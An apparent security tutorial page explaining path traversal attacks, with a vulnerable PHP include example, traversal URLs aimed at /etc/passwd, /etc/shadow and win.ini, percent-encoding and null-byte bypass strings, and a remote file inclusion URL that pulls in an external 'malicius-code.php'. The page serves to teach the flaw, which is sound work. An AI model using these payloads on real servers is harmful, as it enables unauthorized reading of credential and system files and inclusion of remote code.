<h1>Path Traversal</h1>

<p align="center">
<br/>
<img src="https://i.imgur.com/23gjYcI.png" height="300%" width="300%" alt="Prompt Injection"/>
<br />
<br />
</p>

<h2>Definition</h2>

A **path traversal attack (also known as directory traversal)** aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).

<h2>Explanation</h2>
Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:

<code class="code-scrollable">&lt;img src=&quot;/loadImage?filename=218.png&quot;&gt;</code>

The <code>loadImage</code> URL takes a <code>filename</code> parameter and returns the contents of the specified file. The image files are stored on disk in the location <code>/var/www/images/</code>. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:

<code class="code-scrollable">/var/www/images/218.png</code><p>

This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the <code>/etc/passwd</code> file from the server's filesystem:

<code class="code-scrollable">https://insecure-website[.]com/loadImage?filename=../../../etc/passwd</code>

This causes the application to read from the following file path:

<code class="code-scrollable">/var/www/images/../../../etc/passwd</code>

The sequence <code>../</code> is valid within a file path, and means to step up one level in the directory structure. The three consecutive <code>../</code> sequences step up from <code>/var/www/images/</code> to the filesystem root, and so the file that is actually read is:

<code class="code-scrollable">/etc/passwd</code>
  
On Unix-based operating systems, this is a standard file containing details of the users that are registered on the server, but an attacker could retrieve other arbitrary files using the same technique.
On Windows, both <code>../</code> and <code>..\</code> are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:

<code class="code-scrollable">https://insecure-website[.]com/loadImage?filename=..\..\..\windows\win.ini</code>

<h3 id="request-variations">Path Traversal Variations</h3>

<p>Encoding and double encoding:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">%2e%2e%2f</code> represents <code class="language-plaintext highlighter-rouge">../</code></li>
  <li><code class="language-plaintext highlighter-rouge">%2e%2e/</code> represents <code class="language-plaintext highlighter-rouge">../</code></li>
  <li><code class="language-plaintext highlighter-rouge">..%2f</code> represents <code class="language-plaintext highlighter-rouge">../ </code></li>
  <li><code class="language-plaintext highlighter-rouge">%2e%2e%5c</code> represents <code class="language-plaintext highlighter-rouge">..\</code></li>
  <li><code class="language-plaintext highlighter-rouge">%2e%2e\</code> represents <code class="language-plaintext highlighter-rouge">..\ </code></li>
  <li><code class="language-plaintext highlighter-rouge">..%5c</code> represents <code class="language-plaintext highlighter-rouge">..\ </code></li>
  <li><code class="language-plaintext highlighter-rouge">%252e%252e%255c</code> represents <code class="language-plaintext highlighter-rouge">..\ </code></li>
  <li><code class="language-plaintext highlighter-rouge">..%255c</code> represents <code class="language-plaintext highlighter-rouge">..\</code> </li>
</ul>

<p>and so on.</p>

<h4 id="percent-encoding-aka-url-encoding">Percent encoding (aka URL encoding)</h4>

<p>Note that web containers perform one level of decoding on percent
encoded values from forms and URLs.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">..%c0%af</code> represents <code class="language-plaintext highlighter-rouge">../ </code></li>
  <li><code class="language-plaintext highlighter-rouge">..%c1%9c</code> represents <code class="language-plaintext highlighter-rouge">..\ </code></li>
</ul>

<h4 id="os-specific">OS specific</h4>

<p>UNIX</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Root directory:  “ / “ 
Directory separator: “ / “
</code></pre></div></div>

<p>WINDOWS</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Root directory: “  &lt;partition letter&gt; : \ “
Directory separator: “ / “ or “ \ ” 
Note that windows allows filenames to be followed by extra . \ / characters.
</code></pre></div></div>

<p>In many operating systems, null bytes <code class="language-plaintext highlighter-rouge">%00</code> can be injected to terminate the filename. For example, sending a parameter like:</p>

<p><code class="language-plaintext highlighter-rouge">?file=secret.doc%00.pdf</code></p>

<p>will result in the Java application seeing a string that ends with “.pdf” and the operating system will see a file that ends in “.doc”. Attackers may use this trick to bypass validation routines.</p>

<h2 id="examples">Examples</h2>

<h3 id="example-1">Example 1</h3>

<p>The following examples show how the application deals with the resources in use.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://some_site.com.br/get-files.jsp?file=report.pdf
http://some_site.com.br/get-page.php?home=aaa.html 
http://some_site.com.br/some-page.asp?page=index.html
</code></pre></div></div>

<p>In these examples it’s possible to insert a malicious string as the
variable parameter to access files located outside the web publish
directory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://some_site.com.br/get-files?file=../../../../some dir/some file
http://some_site.com.br/../../../../some dir/some file
</code></pre></div></div>

<p>The following URLs show examples of *NIX password file exploitation.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://some_site.com.br/../../../../etc/shadow
http://some_site.com.br/get-files?file=/etc/passwd
</code></pre></div></div>

<p>Note: In a Windows system an attacker can navigate only in a partition
that locates web root while in the Linux they can navigate in the whole
disk.</p>

<h3 id="example-2">Example 2</h3>

<p>It’s also possible to include files and scripts located on external
website.</p>

<p><code class="language-plaintext highlighter-rouge">http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php</code></p>

<h3 id="example-3">Example 3</h3>

<p>These examples illustrate a case when an attacker made the server show
the CGI source code.</p>

<p><code class="language-plaintext highlighter-rouge">http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi</code></p>

<h3 id="example-4">Example 4</h3>

<p>This example was extracted from: <a href="https://en.wikipedia.org/wiki/Directory_traversal_attack#Example">Wikipedia - Directory Traversal</a></p>

<p>A typical example of vulnerable application code is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
$template = 'blue.php';
if ( is_set( $_COOKIE['TEMPLATE'] ) )
   $template = $_COOKIE['TEMPLATE'];
include ( "/home/users/phpguru/templates/" . $template );
?&gt;
</code></pre></div></div>

<p>An attack against this system could be to send the following HTTP
request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd
</code></pre></div></div>

<p>Generating a server response such as:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.0 200 OK
Content-Type: text/html
Server: Apache

root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh
daemon:*:1:1::/tmp:
phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh
</code></pre></div></div>

<p>The repeated <code class="language-plaintext highlighter-rouge">../</code> characters after <code class="language-plaintext highlighter-rouge">/home/users/phpguru/templates/</code> has
caused <a href="http://www.php.net/manual/en/function.include.php">include()</a> to
traverse to the root directory, and then include the UNIX password file
<code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>

<p>UNIX <code class="language-plaintext highlighter-rouge">etc/passwd</code> is a common file used to demonstrate <strong>directory
traversal</strong>, as it is often used by crackers to try cracking the
passwords.</p>

<h3 id="absolute-path-traversal">Absolute Path Traversal</h3>

<p>The following URLs may be vulnerable to this attack:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testsite.com/get.php?f=list
http://testsite.com/get.cgi?f=2
http://testsite.com/get.asp?f=test
</code></pre></div></div>

<p>An attacker can execute this attack like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testsite.com/get.php?f=/var/www/html/get.php
http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc
http://testsite.com/get.asp?f=/etc/passwd
</code></pre></div></div>

<p>When the web server returns information about errors in a web
application, it is much easier for the attacker to guess the correct
locations (e.g. path to the file with a source code, which then may be
displayed).</p>

